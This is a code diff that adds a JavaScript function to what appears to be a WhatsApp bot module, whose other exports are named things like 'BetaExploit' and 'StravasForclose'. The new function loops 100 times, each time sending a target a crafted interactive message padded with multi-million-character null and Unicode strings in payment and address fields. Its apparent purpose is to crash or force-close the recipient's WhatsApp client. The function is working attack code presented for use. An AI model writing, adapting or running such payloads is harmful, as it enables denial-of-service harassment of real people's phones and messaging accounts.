@@ -3891,7 +3891,87 @@ await sock.relayMessage(target, {
     }
   }, {});
 }
-
+// gatau
+async function fcstravas(sock, target) {
+  const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
+  for (let i = 0; i < 100; i++) {
+    const msg = {
+      viewOnceMessageV2: {
+        message: {
+          interactiveMessage: {
+            header: {
+              hasMediaAttachment: true,
+                stickerMessage: {
+                  url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
+                  fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
+                  fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
+                  mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
+                  mimetype: "image/webp",
+                  directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
+                  fileLength: 10610,
+                  mediaKeyTimestamp: 1775044724,
+                  stickerSentTs: 1775044724091,
+               }
+            },
+            nativeFlowMessage: {
+              buttons: [
+                {
+                  name: "review_and_pay",
+                  buttonParamsJson: `{\"currency\":\"IDR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":800,\"offset\":100},\"reference_id\":\"4TU82OG2957\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"description\":\"\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-2c7378a6-1643-4dba-8b2d-23e556a81ad4\",\"name\":\"${'\u0000'.repeat(50000)}\",\"amount\":{\"value\":800,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"xtx\",\"native_payment_methods\":[],\"share_payment_status\":false}`
+                },
+                {
+            name: "cta_url",
+            buttonParamsJson: JSON.stringify({
+              display_text: "maklu yatim",
+              url: "{\"display_text\":\"ⓘ ⸸King\",\"url\":\"http://wa.me/stickerpack/RaJa\",\"merchant_url\":\"https://wa.me/settings/linked_devices/,,Function\"}"
+                }),
+                },
+                {
+                name: "cta_copy",
+                 buttonParamsJson: JSON.stringify({
+                  display_text: "King",
+                  copy_code: "King",
+                }),
+                },
+                {
+                  name: "payment_info",
+                  buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"AmbaJht' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + "꧀".repeat(10000000) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"amba","key":"' + "\u0000".repeat(10000000) + '","key_type":"CPF"}}],"share_payment_status":false}'
+                }
+              ]
+            },
+            contextInfo: {
+              mentionedJid: ["13135559098@s.whatsapp.net"],
+              isForwarded: true,
+              forwardingScore: 9741,
+              stanzaId: target,
+              participant: target,
+              remoteJid: "status@broadcast",
+              quotedMessage: {
+                interactiveResponseMessage: {
+                  body: {
+                    text: "Halo",
+                    format: "DEFAULT"
+                  },
+                  nativeFlowResponseMessage: {
+                    name: "address_message",
+                    paramsJson: `{"values":{"in_pin_code":"999999","building_name":"Leon","landmark_area":"18","address":"K4CUNG","tower_number":"Puny4","city":"Leon","name":"Amp4s","phone_number":"999999999999","house_number":"13135550002","floor_number":"@3135550202","state":"X${"\u0000".repeat(900000)}"}}`,
+                    version: 3
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    };
+    
+    await sock.relayMessage(target, msg, {
+      messageId: Date.now().toString() + Math.random().toString(36).substring(2, 6),
+      participant: { jid: target }
+    });
+    await delay(300);
+  }
+}
 module.exports = {
   // Session management
   activeConnections,
@@ -3973,4 +4053,5 @@ BetaExploit,
   yhcv,
   DelayHard,
   StravasForclose,
+  fcstravas,
 };
